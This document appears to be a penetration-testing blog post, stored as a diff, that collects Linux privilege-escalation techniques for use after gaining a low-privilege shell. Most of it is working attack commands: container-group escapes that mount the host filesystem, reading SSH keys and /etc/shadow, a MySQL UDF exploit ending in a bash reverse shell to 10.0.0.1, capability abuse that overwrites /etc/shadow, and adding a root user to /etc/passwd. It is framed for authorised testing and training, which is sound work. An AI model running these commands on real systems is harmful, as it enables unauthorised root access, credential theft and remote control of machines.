@@ -1,0 +1,399 @@
+I"m<p>If you landed on this page, it probably means that you have a low privilege shell on a target you were allowed to attack and are looking to escalate your privileges. If this is the case, good for you :) Let’s enjoy the shell excitement before enumerating the target all over again!</p>
+
+<p>Before we start, I would like to point out that this is a mere collection of the things I look for once I gain access to a target. It does not make me an expert. It’s just a basic guide that I hope you will find useful.</p>
+
+<h2 id="user-enumeration">User enumeration</h2>
+
+<p><strong>Who am I running as? Can I run sudo?</strong></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="nb">id</span>
+<span class="gp">#</span><span class="nb">whoami</span>
+<span class="gp">#</span><span class="nb">sudo</span> <span class="nt">-l</span>
+</code></pre></div></div>
+
+<p><strong>What are the last commands executed on the system?</strong></p>
+
+<p>If available, the user’s history can contain valuable hints and possibly sensitive information such as the user’s credentials.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="nb">history</span>
+</code></pre></div></div>
+
+<p><strong>Are there any other users on the system?</strong></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="nb">cat</span> /etc/passwd
+</code></pre></div></div>
+
+<p><strong>Do I belong to an interesting group ?</strong></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="nb">groups</span>
+</code></pre></div></div>
+
+<h3 id="interesting-groups-to-look-for">Interesting groups to look for</h3>
+
+<ul>
+  <li><strong>lxc/lxd group</strong></li>
+</ul>
+
+<p>On your attacking machine, build the latest Alpine image by running the below commands as root:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>git clone  https://github.com/saghul/lxd-alpine-builder.git
+<span class="gp">#</span><span class="nb">cd </span>lxd-alpine-builder
+<span class="gp">#</span>./build-alpine
+</code></pre></div></div>
+
+<p>Transfer the Alpine image to the target machine and run the following commands:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>lxc image import ./apline.tar.gz <span class="nt">--alias</span> myimage
+</code></pre></div></div>
+
+<p>You can check the list of images by running:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>lxc image list
+</code></pre></div></div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>lxc init myimage ignite <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true</span>
+<span class="gp">#</span>lxc config device add ignite mydevice disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
+<span class="gp">#</span>lxc start ignite
+<span class="gp">#</span>lxc <span class="nb">exec </span>ignite /bin/sh
+<span class="gp">#</span><span class="nb">id</span>
+<span class="gp">#</span><span class="nb">cd</span> /mnt/root
+</code></pre></div></div>
+
+<p>The target filesystem can be accessed by navigating to /mnt/root.</p>
+
+<ul>
+  <li><strong>Docker group</strong></li>
+</ul>
+
+<p>On the target machine run the below command:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>docker run <span class="nt">-v</span> /:/mnt <span class="nt">-i</span> <span class="nt">-t</span> alpine
+</code></pre></div></div>
+
+<ul>
+  <li><strong>Video Group</strong></li>
+</ul>
+
+<p>This is only interesting if there are other users logged in to the system. By being in the video group, you can control access to the graphical output devices. The screen output is stored in the <a href="https://www.kernel.org/doc/Documentation/fb/framebuffer.txt">framebuffer</a>, which can be dumped to disk and converted to an image.</p>
+
+<p>To check if there are other users logged in to the system, you can run the <em>w</em> command.</p>
+
+<p>If an other user is logged in to the system, it’s your lucky day. The first step is to capture the framebuffer raw data on the board:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="nb">cat</span> /dev/fb0 <span class="o">&gt;</span> /tmp/screen.raw
+</code></pre></div></div>
+
+<p>The second step is to convert the framebuffer screenshot into an image. To do so, you can either use the below <a href="https://www.cnx-software.com/2010/07/18/how-to-do-a-framebuffer-screenshot/">script</a> or <a href="https://www.gimp.org/">Gimp</a>.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="o">!</span>/usr/bin/perl <span class="nt">-w</span>
+<span class="go">
+</span><span class="gp">$</span>w <span class="o">=</span> <span class="nb">shift</span> <span class="o">||</span> 240<span class="p">;</span>
+<span class="gp">$</span>h <span class="o">=</span> <span class="nb">shift</span> <span class="o">||</span> 320<span class="p">;</span>
+<span class="gp">$</span>pixels <span class="o">=</span> <span class="nv">$w</span> <span class="k">*</span> <span class="nv">$h</span><span class="p">;</span>
+<span class="go">
+</span><span class="gp">open OUT, "|pnmtopng" or die "Can't pipe pnmtopng: $</span><span class="o">!</span><span class="se">\n</span><span class="s2">";
+</span><span class="go">
+</span><span class="gp">printf OUT "P6%d %d\n255\n", $</span>w, <span class="nv">$h</span><span class="p">;</span>
+<span class="go">
+</span><span class="gp">while ((read STDIN, $</span>raw, 2<span class="o">)</span> and <span class="nv">$pixels</span><span class="nt">--</span><span class="o">)</span> <span class="o">{</span>
+<span class="gp">   $</span>short <span class="o">=</span> unpack<span class="o">(</span><span class="s1">'S'</span>, <span class="nv">$raw</span><span class="o">)</span><span class="p">;</span>
+<span class="go">   print OUT pack("C3",
+</span><span class="gp">      ($</span>short &amp; 0xf800<span class="o">)</span> <span class="o">&gt;&gt;</span> 8,
+<span class="gp">      ($</span>short &amp; 0x7e0<span class="o">)</span> <span class="o">&gt;&gt;</span> 3,
+<span class="gp">      ($</span>short &amp; 0x1f<span class="o">)</span> <span class="o">&lt;&lt;</span> <span class="no">3</span><span class="sh">);
+</span><span class="go">}
+
+</span><span class="gp">close OUT;</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="nv">width</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> /sys/class/graphics/fb0/virtual_size | <span class="nb">cut</span> <span class="nt">-d</span>, <span class="nt">-f1</span><span class="si">)</span>
+<span class="gp">#</span><span class="nv">height</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat</span> /sys/class/graphics/fb0/virtual_size | <span class="nb">cut</span> <span class="nt">-d</span>, <span class="nt">-f2</span><span class="si">)</span>
+<span class="gp">#</span>./raw2png <span class="nv">$width</span> <span class="nv">$height</span> &lt; /tmp/screen.raw <span class="o">&gt;</span> /tmp/screen.png
+</code></pre></div></div>
+
+<ul>
+  <li><strong>adm group</strong></li>
+</ul>
+
+<p>The admin group or adm allows the user to read log files located under /var/log. By reading log files we can potentially access sensitive informations such as user actions and hidden cron-jobs.</p>
+
+<ul>
+  <li><strong>disk group</strong></li>
+</ul>
+
+<p>If you belong to this group, you have read access to the whole filesystem. You can also modify any file that is not owned by the root user.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>debugfs /dev/sda1
+<span class="gp">#</span>debugfs: <span class="nb">cd</span> /root
+<span class="gp">#</span>debugfs: <span class="nb">cat</span> /root/.ssh/id_rsa
+<span class="gp">#</span>debugfs: <span class="nb">cat</span> /etc/shadow
+</code></pre></div></div>
+
+<h2 id="operating-system-enumeration">Operating system enumeration</h2>
+
+<p><strong>What is the kernel’s version? What is the architecture? Is it vulnerable to known Kernel exploits? Which kernel modules are loaded? Which libc version is the targer running? Is it vulnerable to <a href="https://nvd.nist.gov/vuln/detail/CVE-2010-3856">CVE-2010-3856</a></strong></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="nb">cat</span> /etc/issue
+<span class="gp">#</span><span class="nb">uname</span> <span class="nt">-a</span>
+<span class="gp">#</span>lsmod
+<span class="gp">#</span><span class="nb">cat</span> /proc/modules
+</code></pre></div></div>
+
+<p>If you notice an interesting kernel module, you can use <em>modinfo</em> to have more information about it.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>modinfo interesting-module-name
+</code></pre></div></div>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>/lib/libc.so.6 <span class="nt">--version</span>
+</code></pre></div></div>
+
+<p>In general, if the kernel release date is recent; there is no need to waste time looking for kernel exploits. If the Kernel is pretty old, chances are it is vulnerable to a kernel exploit and you should investigate this vector further. Kernel exploits can be found in <a href="https://www.exploit-db.com/">exploit-db</a>.</p>
+
+<h2 id="process-enumeration">Process enumeration</h2>
+
+<p><strong>Is there a process running with unnecessary root permissions?</strong></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>ps aux
+<span class="gp">#</span>ps aux | <span class="nb">grep </span>root
+</code></pre></div></div>
+
+<h3 id="examples-of-processes-to-look-for">Examples of processes to look for</h3>
+
+<p>The idea here is to hijack a process running as root.</p>
+
+<ul>
+  <li><strong>mysql</strong></li>
+</ul>
+
+<p>We can use <a href="https://www.exploit-db.com/exploits/1518">MySQL UDF Dynamic Library</a> to get root on the system.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>gcc <span class="nt">-g</span> <span class="nt">-c</span> raptor_udf2.c
+<span class="gp">#</span>gcc <span class="nt">-g</span> <span class="nt">-shared</span> <span class="nt">-Wl</span>,-soname,raptor_udf2.so <span class="nt">-o</span> raptor_udf2.so raptor_udf2.o <span class="nt">-lc</span>
+<span class="go">mysql -u root -p
+</span><span class="gp">mysql&gt;</span><span class="w"> </span>use mysql<span class="p">;</span>
+<span class="gp">mysql&gt;</span><span class="w"> </span>create table foo<span class="o">(</span>line blob<span class="o">)</span><span class="p">;</span>
+<span class="gp">mysql&gt;</span><span class="w"> </span>insert into foo values<span class="o">(</span>load_file<span class="o">(</span><span class="s1">'/home/raptor/raptor_udf2.so'</span><span class="o">))</span><span class="p">;</span>
+<span class="gp">mysql&gt;</span><span class="w"> </span><span class="k">select</span> <span class="k">*</span> from foo into dumpfile <span class="s1">'/usr/lib/raptor_udf2.so'</span><span class="p">;</span>
+<span class="gp">mysql&gt;</span><span class="w"> </span>create <span class="k">function </span>do_system returns integer soname <span class="s1">'raptor_udf2.so'</span><span class="p">;</span>
+<span class="gp">mysql&gt;</span><span class="w"> </span><span class="k">select </span>do_system<span class="o">(</span><span class="s1">'bash -i &gt;&amp; /dev/tcp/10.0.0.1/443 0&gt;&amp;1'</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Before running the last command, you will need to set up a Netcat listener on your attacking machine.</p>
+
+<h2 id="network-enumeration">Network Enumeration</h2>
+
+<p><strong>Is there an interesting service listening locally? Which ports are open?</strong></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>ifconfig
+<span class="gp">#</span>netstat <span class="nt">-ano</span>
+<span class="gp">#</span>netstat <span class="nt">-antp</span>
+</code></pre></div></div>
+
+<p>Using the Netstat command, we can see all the listening ports. We can also determine if other users are connected to the target by observing the established connections list.</p>
+
+<div class="panel panel-info">
+      <div class="panel-heading">
+        <h3 class="panel-title">Tip:</h3>
+      </div>
+      <div class="panel-body">
+If you need to attack a local service (listening for connections from the localhost) and the tools you need are not installed on the target, you can do a local port forwarding to your machine.
+
+   </div>
+    </div>
+
+<h3 id="local-port-forwarding-techniques">Local port forwarding techniques</h3>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>ssh <span class="nt">-L</span> 4000:127.0.0.1:3306 root@kali
+</code></pre></div></div>
+
+<p>I also recommend using <a href="https://github.com/jpillora/chisel">chisel</a> to do local port forwarding.</p>
+
+<h2 id="cron-jobs-and-scheduled-tasks-enumeration">Cron jobs and scheduled tasks enumeration</h2>
+
+<p><strong>Is there any cron job running as root?</strong></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="nb">ls</span> <span class="nt">-lah</span> /etc/cron<span class="k">*</span>
+<span class="gp">#</span><span class="nb">cat</span> /etc/crontab
+</code></pre></div></div>
+
+<p>The idea here is to inspect scheduled tasks for insecure file permissions. For instance, if a script is running every couple of minutes as root and you can modify its contents, you can basically run any command as root.
+If you don’t have write permission to the script, it does not mean it’s over. Try to understand what the script is doing. Perhaps you have write access to a binary it’s calling?
+Reverse engineering the binary is the way to go here. You can use <a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a>.</p>
+
+<p>You can also use <a href="https://github.com/DominicBreuker/pspy">pspy</a>; a tool designed to show you commands run by other users and cron jobs as they execute.</p>
+
+<p><a href="https://ippsec.rocks/">Ippsec</a> has created the below process monitor bash script in one of his videos to check cron jobs.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="o">!</span>/bin/bash
+<span class="go">
+</span><span class="gp">#</span><span class="w"> </span>Loop by line
+<span class="gp">IFS=$</span><span class="s1">'\n'</span>
+<span class="go">
+</span><span class="gp">old_process=$</span><span class="o">(</span>ps aux <span class="nt">--forest</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"ps aux --forest"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"sleep 1"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nv">$0</span><span class="o">)</span>
+<span class="go">
+</span><span class="gp">while true;</span><span class="w"> </span><span class="k">do</span>
+<span class="gp">  new_process=$</span><span class="o">(</span>ps aux <span class="nt">--forest</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"ps aux --forest"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"sleep 1"</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="nv">$0</span><span class="o">)</span>
+<span class="gp">  diff &lt;(echo "$</span>old_process<span class="s2">") &lt;(echo "</span><span class="nv">$new_process</span><span class="s2">") | grep [</span><span class="se">\&lt;\&gt;</span><span class="s2">]
+</span><span class="go">  sleep 1
+</span><span class="gp">  old_process=$</span>new_process
+<span class="go">done
+</span></code></pre></div></div>
+
+<h2 id="installed-applications-and-packages-enumeration">Installed applications and packages enumeration</h2>
+
+<p><strong>Which packages are installed? Which versions are they running? Are they vulnerable to known issues?</strong></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>dpkg <span class="nt">-l</span> <span class="c">#Debian</span>
+<span class="gp">#</span>rpm <span class="nt">-qa</span> <span class="c">#Centos</span>
+<span class="gp">#</span>dpkg <span class="nt">-s</span> <span class="o">{</span>package-name-here<span class="o">}</span>
+<span class="gp">#</span>dpkg <span class="nt">-s</span> <span class="o">{</span>package-name-here<span class="o">}</span> | <span class="nb">grep</span> <span class="nt">-i</span> version
+</code></pre></div></div>
+
+<h2 id="suid-binaries-enumeration">SUID binaries enumeration</h2>
+
+<p><strong>Can we abuse SUID programs?</strong></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
+</code></pre></div></div>
+
+<div class="panel panel-info">
+      <div class="panel-heading">
+        <h3 class="panel-title">Info:</h3>
+      </div>
+      <div class="panel-body">
+When we run an executable, it inherits the permissions of the user we are running as. However, if the binary has the setuid bit enabled, it will run under the context of the root user. This enables normal (non-privileged) users to use special privileges, like opening sockets. In some cases, this is actually needed. As an example, we wouldn't be able to execute basic commands like ping without the setuid bit. In other cases, binaries with the suid bit can be exploited in order to gain root permissions. As an example, if cp or cat were SUID, we would be able to copy, overwrite and read sensitive files.
+
+   </div>
+    </div>
+
+<p>This <a href="https://gtfobins.github.io/#+suid">GTFOBins</a> contains a list of binaries we can exploit if they were SUID.</p>
+
+<p>There is also a <a href="https://github.com/Anon-Exploiter/SUID3NUM">python script</a> that automatically finds SUID bins, separates default bins from custom bins and cross-match those with bins in GTFO Bin’s repository.</p>
+
+<h2 id="capabilities-enumeration">Capabilities enumeration</h2>
+
+<p><strong>Which capabilities are enabled?</strong></p>
+
+<div class="panel panel-info">
+      <div class="panel-heading">
+        <h3 class="panel-title">Info:</h3>
+      </div>
+      <div class="panel-body">
+As described in <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Linux capabilities man page</a>; For the purpose of performing permission checks, traditional UNIX
+       implementations distinguish two categories of processes: privileged
+       processes (whose effective user ID is 0, referred to as superuser or
+       root), and unprivileged processes (whose effective UID is nonzero).
+       Privileged processes bypass all kernel permission checks, while
+       unprivileged processes are subject to full permission checking based
+       on the process's credentials (usually: effective UID, effective GID,
+       and supplementary group list).
+       Starting with kernel 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities,
+       which can be independently enabled and disabled. The idea is to divide all the possible privileged kernel calls into groups of related functionality. Since only the necessary subset of capabilities are assigned to an executable; in case of successful exploitation; an attacker would only gain access to the assigned subset of capabilities and not the entire system.
+   </div>
+    </div>
+
+<p>In order to identify programs in a system or folder with capabilities, we can use the <em>getcap</em> command.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>getcap <span class="nt">-r</span> / 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>To summarise, if you find a binary that:</p>
+
+<ol>
+  <li>Is not owned by root.</li>
+  <li>Has no SUID/SGID bits set.</li>
+  <li>Has empty capabilities set (e.g.: getcap program returns myelf =ep)</li>
+</ol>
+
+<p>Then that binary will run as root.</p>
+
+<h3 id="classic-examples">Classic examples</h3>
+
+<ol>
+  <li><em>Openssl</em></li>
+</ol>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>getcap <span class="nt">-r</span> / 2&gt;/dev/null
+<span class="gp">#</span>/home/user/openssl <span class="o">=</span>ep
+<span class="gp">#</span><span class="nb">cd</span> /tmp
+<span class="gp">#</span>openssl req <span class="nt">-x509</span> <span class="nt">-newkey</span> rsa:2048 <span class="nt">-keyout</span> key.pem <span class="nt">-out</span> cert.pem <span class="nt">-days</span> 365 <span class="nt">-nodes</span>
+<span class="gp">#</span>openssl s_server <span class="nt">-key</span> /tmp/key.pem <span class="nt">-cert</span> /tmp/cert.pem <span class="nt">-port</span> 1337 <span class="nt">-HTTP</span>
+<span class="gp">#</span>curl <span class="nt">-k</span> <span class="s2">"https://127.0.0.1:1337/etc/shadow"</span>
+<span class="gp">root:$</span>6<span class="nv">$saltsalt$HOC6AvLVkxCTYnJ5Tc78</span>.CYF/KdcBDmheMbOGQTqiMUZhdKof7eXjN9/6I3w8smybsEQEaz5Vh8aoGGs71hf20:17673:0:99999:7:::
+<span class="go">bin:*:17632:0:99999:7:::
+daemon:*:17632:0:99999:7:::
+</span></code></pre></div></div>
+
+<p>We can also create a new shadow file.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>/tmp/shadow.custom <span class="c">#shadow file with the modified root password</span>
+<span class="gp">#</span>openssl smime <span class="nt">-encrypt</span> <span class="nt">-aes256</span> <span class="nt">-in</span> /tmp/shadow.custom <span class="nt">-binary</span> <span class="nt">-outform</span> DER <span class="nt">-out</span> /tmp/shadow.custom.enc /tmp/cert.pem
+<span class="gp">#</span>openssl smime <span class="nt">-decrypt</span> <span class="nt">-in</span> /tmp/shadow.custom <span class="nt">-inform</span> DER <span class="nt">-inkey</span> /tmp/key.pem <span class="nt">-out</span> /etc/shadow
+</code></pre></div></div>
+
+<p>2.<em>Tar</em></p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>getcap <span class="nt">-r</span> 2&gt;/dev/null
+<span class="gp">#</span><span class="nb">tar</span> <span class="o">=</span> cap_dac_read_search+ep
+</code></pre></div></div>
+
+<p>This means that tar has read access to everything. We can use it to archive any sensitive file in the filesystem.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span><span class="nb">tar</span> <span class="nt">-cvf</span> shadow.tar /etc/shadow
+<span class="gp">#</span><span class="nb">tar</span> <span class="nt">-xvf</span> shadow.tar
+<span class="gp">#</span><span class="nb">cat </span>etc/shadow
+</code></pre></div></div>
+
+<p>If you are not sure whether a capability is exploitable or not, you can search for the binary on <a href="https://gtfobins.github.io/#+capabilities">GTFObins</a>.</p>
+
+<h2 id="sensitive-file-permissions-enumeration">Sensitive file permissions enumeration</h2>
+
+<p><strong>Can we modify sensitive files?</strong></p>
+
+<h3 id="classic-examples-1">Classic examples</h3>
+
+<ol>
+  <li><em>Write access to the /etc/passwd file</em></li>
+</ol>
+
+<div class="panel panel-info">
+      <div class="panel-heading">
+        <h3 class="panel-title">Info:</h3>
+      </div>
+      <div class="panel-body">
+Linux password hashes are generally stored in the /etc/shadow file. This file is only readable by the root user. 
+/etc/passwd file only contains users account details and is readable by everyone. 
+Historically however, users password hashes were stored in the /etc/passwd file. For backwards compatibility, if a password hash is present in the /etc/passwd, it is considered valid for authentication and any entry in /etc/shadow for that user will be ignored. 	
+   </div>
+    </div>
+
+<p>If we have write access to the /etc/passwd file, we can create a new user root.</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">#</span>openssl passwd hacked
+<span class="gp">#</span>8kfhJyVOSM93c
+<span class="gp">#</span><span class="nb">echo</span> <span class="s2">"hacker:8kfhJyVOSM93c:root:/root:/bin/bash"</span> <span class="o">&gt;&gt;</span>/etc/passwd
+<span class="gp">#</span>su hacker
+<span class="go">Password: hacked
+</span></code></pre></div></div>
+
+<h2 id="automated-scripts">Automated scripts</h2>
+
+<ol>
+  <li><a href="https://github.com/rebootuser/LinEnum">LinEnum.sh</a></li>
+  <li><a href="https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py">LinuxPrivChecker.py</a></li>
+  <li><a href="https://github.com/jondonas/linux-exploit-suggester-2">Linux-Exploit-Suggester-2.pl</a></li>
+  <li><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS.sh</a></li>
+</ol>
+
+<h3 id="references--further-readings">References &amp; Further readings</h3>
+
+<ul>
+  <li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li>
+  <li><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a></li>
+  <li><a href="https://fosterelli.co/privilege-escalation-via-docker.html">https://fosterelli.co/privilege-escalation-via-docker.html</a></li>
+  <li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe</a></li>
+  <li><a href="https://www.hackingarticles.in/docker-privilege-escalation/">https://www.hackingarticles.in/docker-privilege-escalation/</a></li>
+  <li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/">https://book.hacktricks.xyz/linux-unix/privilege-escalation/</a></li>
+  <li><a href="https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html">https://reboare.gitbooks.io/booj-security/content/general-linux/privilege-escalation.html</a></li>
+</ul>
+:ET
